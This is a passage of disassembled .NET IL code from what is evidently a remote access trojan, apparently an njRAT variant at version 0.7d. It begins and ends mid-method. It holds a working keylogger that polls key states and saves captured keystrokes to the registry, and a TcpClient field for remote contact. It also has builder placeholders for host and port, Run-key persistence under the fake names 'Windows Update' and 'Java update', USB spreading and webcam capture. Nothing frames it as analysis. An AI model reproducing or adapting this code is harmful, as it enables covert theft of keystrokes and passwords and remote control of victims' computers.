      IL_00cf:  bne.un.s   IL_00d3

      IL_00d1:  br.s       IL_00d9

      IL_00d3:  ldloc.s    V_5
      IL_00d5:  ldc.i4.s   112
      IL_00d7:  bne.un.s   IL_00db

      IL_00d9:  br.s       IL_00e1

      IL_00db:  ldloc.s    V_5
      IL_00dd:  ldc.i4.s   113
      IL_00df:  bne.un.s   IL_00e3

      IL_00e1:  br.s       IL_00e9

      IL_00e3:  ldloc.s    V_5
      IL_00e5:  ldc.i4.s   114
      IL_00e7:  bne.un.s   IL_00eb

      IL_00e9:  br.s       IL_00f1

      IL_00eb:  ldloc.s    V_5
      IL_00ed:  ldc.i4.s   115
      IL_00ef:  bne.un.s   IL_00f3

      IL_00f1:  br.s       IL_00f9

      IL_00f3:  ldloc.s    V_5
      IL_00f5:  ldc.i4.s   116
      IL_00f7:  bne.un.s   IL_00fb

      IL_00f9:  br.s       IL_0101

      IL_00fb:  ldloc.s    V_5
      IL_00fd:  ldc.i4.s   117
      IL_00ff:  bne.un.s   IL_0103

      IL_0101:  br.s       IL_0109

      IL_0103:  ldloc.s    V_5
      IL_0105:  ldc.i4.s   118
      IL_0107:  bne.un.s   IL_010b

      IL_0109:  br.s       IL_0111

      IL_010b:  ldloc.s    V_5
      IL_010d:  ldc.i4.s   119
      IL_010f:  bne.un.s   IL_0113

      IL_0111:  br.s       IL_0119

      IL_0113:  ldloc.s    V_5
      IL_0115:  ldc.i4.s   120
      IL_0117:  bne.un.s   IL_011b

      IL_0119:  br.s       IL_0121

      IL_011b:  ldloc.s    V_5
      IL_011d:  ldc.i4.s   121
      IL_011f:  bne.un.s   IL_0123

      IL_0121:  br.s       IL_0129

      IL_0123:  ldloc.s    V_5
      IL_0125:  ldc.i4.s   122
      IL_0127:  bne.un.s   IL_012b

      IL_0129:  br.s       IL_0131

      IL_012b:  ldloc.s    V_5
      IL_012d:  ldc.i4.s   123
      IL_012f:  bne.un.s   IL_0133

      IL_0131:  br.s       IL_013c

      IL_0133:  ldloc.s    V_5
      IL_0135:  ldc.i4.s   35
      IL_0137:  beq.s      IL_013c

      IL_0139:  ldc.i4.0
      IL_013a:  br.s       IL_013d

      IL_013c:  ldc.i4.1
      IL_013d:  nop
      IL_013e:  stloc.s    V_8
      IL_0140:  ldloc.s    V_8
      IL_0142:  brfalse.s  IL_0151

      IL_0144:  ldstr      ""
      IL_0149:  stloc.0
      IL_014a:  leave      IL_0253

      IL_014f:  br.s       IL_01ca

      IL_0151:  nop
      IL_0152:  ldloc.s    V_5
      IL_0154:  ldc.i4.s   32
      IL_0156:  ceq
      IL_0158:  stloc.s    V_8
      IL_015a:  ldloc.s    V_8
      IL_015c:  brfalse.s  IL_016b

      IL_015e:  ldstr      " "
      IL_0163:  stloc.0
      IL_0164:  leave      IL_0253

      IL_0169:  br.s       IL_01ca

      IL_016b:  nop
      IL_016c:  ldloc.s    V_5
      IL_016e:  ldc.i4.s   13
      IL_0170:  beq.s      IL_017b

      IL_0172:  ldloc.s    V_5
      IL_0174:  ldc.i4.s   13
      IL_0176:  beq.s      IL_017b

      IL_0178:  ldc.i4.0
      IL_0179:  br.s       IL_017c

      IL_017b:  ldc.i4.1
      IL_017c:  nop
      IL_017d:  stloc.s    V_8
      IL_017f:  ldloc.s    V_8
      IL_0181:  brfalse.s  IL_01b2

      IL_0183:  ldarg.0
      IL_0184:  ldfld      string j.kl::Logs
      IL_0189:  ldstr      "[ENTER]\r\n"
      IL_018e:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_0193:  stloc.s    V_7
      IL_0195:  ldloc.s    V_7
      IL_0197:  brfalse.s  IL_01a4

      IL_0199:  ldstr      ""
      IL_019e:  stloc.0
      IL_019f:  leave      IL_0253

      IL_01a4:  nop
      IL_01a5:  ldstr      "[ENTER]\r\n"
      IL_01aa:  stloc.0
      IL_01ab:  leave      IL_0253

      IL_01b0:  br.s       IL_01ca

      IL_01b2:  nop
      IL_01b3:  ldloc.s    V_5
      IL_01b5:  ldc.i4.s   9
      IL_01b7:  ceq
      IL_01b9:  stloc.s    V_8
      IL_01bb:  ldloc.s    V_8
      IL_01bd:  brfalse.s  IL_01ca

      IL_01bf:  ldstr      "[TAP]\r\n"
      IL_01c4:  stloc.0
      IL_01c5:  leave      IL_0253

      IL_01ca:  nop
      IL_01cb:  ldloc.1
      IL_01cc:  stloc.s    V_8
      IL_01ce:  ldloc.s    V_8
      IL_01d0:  brfalse.s  IL_01e1

      IL_01d2:  ldarg.1
      IL_01d3:  conv.ovf.u4
      IL_01d4:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_01d9:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_01de:  stloc.0
      IL_01df:  leave.s    IL_0253

      IL_01e1:  nop
      IL_01e2:  ldarg.1
      IL_01e3:  conv.ovf.u4
      IL_01e4:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_01e9:  stloc.2
      IL_01ea:  leave.s    IL_024e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ec:  dup
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f2:  stloc.s    V_4
      IL_01f4:  nop
      IL_01f5:  ldloc.s    V_4
      IL_01f7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01fc:  nop
      IL_01fd:  ldloc.s    V_4
      IL_01ff:  stloc.3
      IL_0200:  ldloc.1
      IL_0201:  stloc.s    V_8
      IL_0203:  ldloc.s    V_8
      IL_0205:  brfalse.s  IL_022b

      IL_0207:  ldarg.1
      IL_0208:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_020d:  stloc.s    V_6
      IL_020f:  ldloca.s   V_6
      IL_0211:  call       instance string [mscorlib]System.Char::ToString()
      IL_0216:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_021b:  stloc.2
      IL_021c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0221:  nop
      IL_0222:  ldloc.2
      IL_0223:  stloc.0
      IL_0224:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0229:  leave.s    IL_0253

      IL_022b:  nop
      IL_022c:  ldarg.1
      IL_022d:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0232:  stloc.s    V_6
      IL_0234:  ldloca.s   V_6
      IL_0236:  call       instance string [mscorlib]System.Char::ToString()
      IL_023b:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0240:  stloc.2
      IL_0241:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0246:  nop
      IL_0247:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_024c:  leave.s    IL_024e

    }  // end handler
    IL_024e:  nop
    IL_024f:  ldloc.2
    IL_0250:  stloc.0
    IL_0251:  br.s       IL_0253

    IL_0253:  ldloc.0
    IL_0254:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       155 (0x9b)
    .maxstack  7
    .locals init (string V_0,
             uint32 V_1,
             uint8[] V_2,
             class [mscorlib]System.Text.StringBuilder V_3,
             native int V_4,
             int32 V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0007:  stloc.3
      IL_0008:  ldc.i4     0xff
      IL_000d:  newarr     [mscorlib]System.Byte
      IL_0012:  stloc.2
      IL_0013:  ldloc.2
      IL_0014:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0019:  ldc.i4.0
      IL_001a:  ceq
      IL_001c:  stloc.s    V_8
      IL_001e:  ldloc.s    V_8
      IL_0020:  brfalse.s  IL_002a

      IL_0022:  ldstr      ""
      IL_0027:  stloc.0
      IL_0028:  leave.s    IL_0099

      IL_002a:  nop
      IL_002b:  ldarg.0
      IL_002c:  ldc.i4.0
      IL_002d:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0032:  stloc.1
      IL_0033:  ldc.i4.0
      IL_0034:  stloc.s    V_5
      IL_0036:  call       native int j.OK::GetForegroundWindow_()
      IL_003b:  ldloca.s   V_5
      IL_003d:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0042:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    V_4
      IL_004e:  ldarg.0
      IL_004f:  ldloc.1
      IL_0050:  ldloc.2
      IL_0051:  ldloc.3
      IL_0052:  ldc.i4.5
      IL_0053:  ldc.i4.0
      IL_0054:  ldloc.s    V_4
      IL_0056:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_005b:  pop
      IL_005c:  ldloc.3
      IL_005d:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0062:  stloc.0
      IL_0063:  leave.s    IL_0099

      IL_0065:  leave.s    IL_0089

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0067:  dup
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006d:  stloc.s    V_7
      IL_006f:  nop
      IL_0070:  ldloc.s    V_7
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0077:  nop
      IL_0078:  ldloc.s    V_7
      IL_007a:  stloc.s    V_6
      IL_007c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0081:  nop
      IL_0082:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0087:  leave.s    IL_0089

    }  // end handler
    IL_0089:  nop
    IL_008a:  ldarg.0
    IL_008b:  conv.ovf.i4.un
    IL_008c:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0091:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0096:  stloc.0
    IL_0097:  br.s       IL_0099

    IL_0099:  ldloc.0
    IL_009a:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       350 (0x15e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             bool V_7)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.0
    IL_0003:  ldfld      string j.kl::vn
    IL_0008:  ldstr      ""
    IL_000d:  call       object j.OK::GTV(string,
                                          object)
    IL_0012:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0017:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001c:  stfld      string j.kl::Logs
    IL_0021:  nop
    .try
    {
      IL_0022:  ldc.i4.0
      IL_0023:  stloc.0
      IL_0024:  br         IL_012d

      IL_0029:  ldloc.0
      IL_002a:  ldc.i4.1
      IL_002b:  add.ovf
      IL_002c:  stloc.0
      IL_002d:  ldc.i4.0
      IL_002e:  stloc.1
      IL_002f:  nop
      IL_0030:  ldloc.1
      IL_0031:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_0036:  ldc.i4     0xffff8001
      IL_003b:  ceq
      IL_003d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0042:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_0047:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  and
      IL_0050:  stloc.s    V_7
      IL_0052:  ldloc.s    V_7
      IL_0054:  brfalse.s  IL_00a0

      IL_0056:  ldloc.1
      IL_0057:  stloc.2
      IL_0058:  ldarg.0
      IL_0059:  ldloc.2
      IL_005a:  callvirt   instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_005f:  stloc.3
      IL_0060:  ldloc.3
      IL_0061:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0066:  ldc.i4.0
      IL_0067:  cgt
      IL_0069:  stloc.s    V_7
      IL_006b:  ldloc.s    V_7
      IL_006d:  brfalse.s  IL_0098

      IL_006f:  ldarg.0
      IL_0070:  ldarg.0
      IL_0071:  ldfld      string j.kl::Logs
      IL_0076:  ldarg.0
      IL_0077:  callvirt   instance string j.kl::AV()
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldarg.0
      IL_0088:  ldfld      string j.kl::Logs
      IL_008d:  ldloc.3
      IL_008e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0093:  stfld      string j.kl::Logs
      IL_0098:  nop
      IL_0099:  ldarg.0
      IL_009a:  ldloc.2
      IL_009b:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_00a0:  nop
      IL_00a1:  ldloc.1
      IL_00a2:  ldc.i4.1
      IL_00a3:  add.ovf
      IL_00a4:  stloc.1
      IL_00a5:  ldloc.1
      IL_00a6:  ldc.i4     0xff
      IL_00ab:  cgt
      IL_00ad:  ldc.i4.0
      IL_00ae:  ceq
      IL_00b0:  stloc.s    V_7
      IL_00b2:  ldloc.s    V_7
      IL_00b4:  brtrue     IL_0030

      IL_00b9:  ldloc.0
      IL_00ba:  ldc.i4     0x3e8
      IL_00bf:  ceq
      IL_00c1:  stloc.s    V_7
      IL_00c3:  ldloc.s    V_7
      IL_00c5:  brfalse.s  IL_0124

      IL_00c7:  ldc.i4.0
      IL_00c8:  stloc.0
      IL_00c9:  ldstr      "[klen]"
      IL_00ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00d3:  ldc.i4     0x400
      IL_00d8:  mul.ovf
      IL_00d9:  stloc.s    V_4
      IL_00db:  ldarg.0
      IL_00dc:  ldfld      string j.kl::Logs
      IL_00e1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00e6:  ldloc.s    V_4
      IL_00e8:  cgt
      IL_00ea:  stloc.s    V_7
      IL_00ec:  ldloc.s    V_7
      IL_00ee:  brfalse.s  IL_0110

      IL_00f0:  ldarg.0
      IL_00f1:  ldarg.0
      IL_00f2:  ldfld      string j.kl::Logs
      IL_00f7:  ldc.i4.0
      IL_00f8:  ldarg.0
      IL_00f9:  ldfld      string j.kl::Logs
      IL_00fe:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0103:  ldloc.s    V_4
      IL_0105:  sub.ovf
      IL_0106:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_010b:  stfld      string j.kl::Logs
      IL_0110:  nop
      IL_0111:  ldarg.0
      IL_0112:  ldfld      string j.kl::vn
      IL_0117:  ldarg.0
      IL_0118:  ldfld      string j.kl::Logs
      IL_011d:  ldc.i4.1
      IL_011e:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0123:  pop
      IL_0124:  nop
      IL_0125:  ldc.i4.1
      IL_0126:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_012b:  nop
      IL_012c:  nop
      IL_012d:  ldc.i4.1
      IL_012e:  stloc.s    V_7
      IL_0130:  ldloc.s    V_7
      IL_0132:  brtrue     IL_0029

      IL_0137:  leave.s    IL_015b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0139:  dup
      IL_013a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013f:  stloc.s    V_6
      IL_0141:  nop
      IL_0142:  ldloc.s    V_6
      IL_0144:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0149:  nop
      IL_014a:  ldloc.s    V_6
      IL_014c:  stloc.s    V_5
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  nop
      IL_0154:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0159:  leave.s    IL_015b

    }  // end handler
    IL_015b:  nop
    IL_015c:  nop
    IL_015d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public CallBack
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method CallBack::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 hwnd,
                        int32 lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method CallBack::BeginInvoke

    .method public newslot strict virtual 
            instance bool  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method CallBack::EndInvoke

    .method public newslot strict virtual 
            instance bool  Invoke(int32 hwnd,
                                  int32 lParam) runtime managed
    {
    } // end of method CallBack::Invoke

  } // end of class CallBack

  .class sequential ansi sealed nested public CLIENT_ID
         extends [mscorlib]System.ValueType
  {
    .field public int64 UniqueProcess
    .field public int64 UniqueThread
  } // end of class CLIENT_ID

  .field private int32 _iWin32Window
  .field private static object _NomeSpreadDiscoLocal
  .custom instance void [mscorlib]System.Diagnostics.DebuggerBrowsableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggerBrowsableState) = ( 01 00 00 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private object _CultureInfo_
  .custom instance void [mscorlib]System.Diagnostics.DebuggerBrowsableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggerBrowsableState) = ( 01 00 00 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field public static literal int32 SWP_HIDEWINDOW = int32(0x00000080)
  .field public static literal int32 SWP_SHOWWINDOW = int32(0x00000040)
  .field private static literal int32 SPI_SETDESKWALLPAPER = int32(0x00000014)
  .field private static literal int32 SPIF_UPDATEINIFILE = int32(0x00000001)
  .field public static literal int32 SWP_HIDEWINDOW_ = int32(0x00000080)
  .field public static literal int32 SWP_SHOWWINDOW_ = int32(0x00000040)
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public string msgf
  .field public string msgbox9
  .field public string msgbox8
  .field public string Spryahoo
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool IsF
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string xDlol1
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public bool SPR
  .field public static string VR
  .field public static string Y
  .field private static literal int32 SW_HIDE = int32(0x00000000)
  .field private static literal int32 SW_RESTORE = int32(0x00000009)
  .field private int32 hWnd
  .field public int32 selectedIndex
  .field private class [mscorlib]System.Collections.ObjectModel.Collection`1<native int> ActiveWindows
  .field private int32 taskBar
  .field private class [System.Windows.Forms]System.Windows.Forms.TextBox TextBox13
  .field private class [System.Windows.Forms]System.Windows.Forms.TextBox TextBox12
  .field private class [System.Windows.Forms]System.Windows.Forms.TextBox TextBox8
  .field private class [System.Windows.Forms]System.Windows.Forms.TextBox TextB
  .field private class [System.Windows.Forms]System.Windows.Forms.TextBox zoooom
  .field private static literal int32 SHERB_NOCONFIRMATION = int32(0x00000001)
  .field private static literal int32 SHERB_NOPROGRESSUI = int32(0x00000002)
  .field private static literal int32 SHERB_NOSOUND = int32(0x00000004)
  .field private string culture
  .field private string country
  .field private int32 taskBar_
  .field private static literal int32 TASKBAR_SHOW = int32(0x00000040)
  .field private static literal int32 TASKBAR_HIDE = int32(0x00000080)
  .field private static literal int32 SETDESKWALLPAPER = int32(0x00000014)
  .field private static literal int32 UPDATEINIFILE = int32(0x00000001)
  .field public int32 tictoc
  .field private string makel
  .field private string text1
  .field private string text2
  .field private string namev
  .field private string flder
  .field private string RG_
  .field private static literal string spl = "abccba"
  .field private class [System.Windows.Forms]System.Windows.Forms.PictureBox PictureBox1
  .field private bool streamWebcam
  .field public string loggg
  .field public int32 xxx
  .field private string id
  .field private int32 pfnStartAddr
  .field public string screamx
  .field public string scream
  .field public string hid
  .field public string S762
  .field public string ooo
  .field public string LogsPathsoo
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       257 (0x101)
    .maxstack  1
    IL_0000:  ldc.i4     0x1401
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  stsfld     uint8[] j.OK::b
    IL_000f:  ldstr      "[BD]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool j.OK::BD
    IL_001e:  ldnull
    IL_001f:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0024:  ldc.i4.0
    IL_0025:  stsfld     bool j.OK::Cn
    IL_002a:  ldstr      "[DR]"
    IL_002f:  stsfld     string j.OK::DR
    IL_0034:  ldstr      "[EXE]"
    IL_0039:  stsfld     string j.OK::EXE
    IL_003e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0043:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0048:  ldstr      "[H]"
    IL_004d:  stsfld     string j.OK::H
    IL_0052:  ldstr      "[Idr]"
    IL_0057:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005c:  stsfld     bool j.OK::Idr
    IL_0061:  ldstr      "[Isf]"
    IL_0066:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006b:  stsfld     bool j.OK::IsF
    IL_0070:  ldstr      "[Isu]"
    IL_0075:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007a:  stsfld     bool j.OK::Isu
    IL_007f:  ldnull
    IL_0080:  stsfld     class j.kl j.OK::kq
    IL_0085:  ldstr      ""
    IL_008a:  stsfld     string j.OK::lastcap
    IL_008f:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0094:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_0099:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_009e:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00a3:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00a8:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_00ad:  ldnull
    IL_00ae:  stsfld     object j.OK::MT
    IL_00b3:  ldstr      "[P]"
    IL_00b8:  stsfld     string j.OK::P
    IL_00bd:  ldnull
    IL_00be:  stsfld     object j.OK::PLG
    IL_00c3:  ldstr      "Java update"
    IL_00c8:  stsfld     string j.OK::xDlol1
    IL_00cd:  ldstr      "Windows Update"
    IL_00d2:  stsfld     string j.OK::RG
    IL_00d7:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00dc:  stsfld     string j.OK::sf
    IL_00e1:  ldstr      "[VN]"
    IL_00e6:  stsfld     string j.OK::VN
    IL_00eb:  ldstr      "0.7d"
    IL_00f0:  stsfld     string j.OK::VR
    IL_00f5:  ldstr      "|'|'|"
    IL_00fa:  stsfld     string j.OK::Y
    IL_00ff:  nop
    IL_0100:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       504 (0x1f8)
    .maxstack  8
    .locals init (string V_0,
             string V_1)
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  ldstr      "%msgf%"
    IL_000d:  stfld      string j.OK::msgf
    IL_0012:  ldarg.0
    IL_0013:  ldstr      "%msgbox%"
    IL_0018:  stfld      string j.OK::msgbox9
    IL_001d:  ldarg.0
    IL_001e:  ldstr      "%msgbod%"
    IL_0023:  stfld      string j.OK::msgbox8
    IL_0028:  ldarg.0
    IL_0029:  ldstr      "%yahoo%"
    IL_002e:  stfld      string j.OK::Spryahoo
    IL_0033:  ldarg.0
    IL_0034:  ldstr      "%usb%"
    IL_0039:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_003e:  stfld      bool j.OK::SPR
    IL_0043:  ldarg.0
    IL_0044:  newobj     instance void class [mscorlib]System.Collections.ObjectModel.Collection`1<native int>::.ctor()
    IL_0049:  stfld      class [mscorlib]System.Collections.ObjectModel.Collection`1<native int> j.OK::ActiveWindows
    IL_004e:  ldarg.0
    IL_004f:  ldarg.0
    IL_0050:  ldstr      "Shell_traywnd"
    IL_0055:  ldstr      ""
    IL_005a:  callvirt   instance int32 j.OK::get_IWin32Window(string,
                                                               string)
    IL_005f:  stfld      int32 j.OK::taskBar
    IL_0064:  ldarg.0
    IL_0065:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.TextBox::.ctor()
    IL_006a:  stfld      class [System.Windows.Forms]System.Windows.Forms.TextBox j.OK::TextBox13
    IL_006f:  ldarg.0
    IL_0070:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.TextBox::.ctor()
    IL_0075:  stfld      class [System.Windows.Forms]System.Windows.Forms.TextBox j.OK::TextBox12
    IL_007a:  ldarg.0
    IL_007b:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.TextBox::.ctor()
    IL_0080:  stfld      class [System.Windows.Forms]System.Windows.Forms.TextBox j.OK::TextBox8
    IL_0085:  ldarg.0
    IL_0086:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.TextBox::.ctor()
    IL_008b:  stfld      class [System.Windows.Forms]System.Windows.Forms.TextBox j.OK::TextB
    IL_0090:  ldarg.0
    IL_0091:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.TextBox::.ctor()
    IL_0096:  stfld      class [System.Windows.Forms]System.Windows.Forms.TextBox j.OK::zoooom
    IL_009b:  ldarg.0
    IL_009c:  ldarg.0
    IL_009d:  callvirt   instance object j.OK::get_CultureInfo_()
    IL_00a2:  ldnull
    IL_00a3:  ldstr      "CurrentCulture"
    IL_00a8:  ldc.i4.0
    IL_00a9:  newarr     [mscorlib]System.Object
    IL_00ae:  ldnull
    IL_00af:  ldnull
    IL_00b0:  ldnull
    IL_00b1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
